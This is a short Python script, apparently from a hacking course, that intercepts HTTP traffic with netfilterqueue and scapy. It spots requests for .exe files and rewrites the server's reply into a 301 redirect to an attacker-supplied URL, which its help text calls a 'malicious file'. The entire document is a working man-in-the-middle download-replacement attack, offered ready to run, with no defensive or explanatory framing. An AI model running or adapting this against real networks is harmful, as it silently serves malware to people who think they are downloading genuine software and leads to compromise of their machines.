#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy
import optparse

ack_list = []

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-u", "--url", dest="file_url", help="URL to malicious file for redirection")
    (options, arguments) = parser.parse_args()

    if not options.file_url:
        parser.error("[-] Please specify a file URL, use --help for more info.")

    return options

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            if ".exe" in scapy_packet[scapy.Raw].load:
                print ("[+] exe Request detected")
                ack_list.append(scapy_packet[scapy.TCP].ack)

        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print ("[+] Replacing file with:", options.file_url)
                modified_packet = set_load(
                    scapy_packet,
                    "HTTP/1.1 301 Moved Permanently\n"
                    "Location: " + options.file_url + "\n\n"
                )
                packet.set_payload(str(modified_packet))

    packet.accept()

options = get_arguments()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
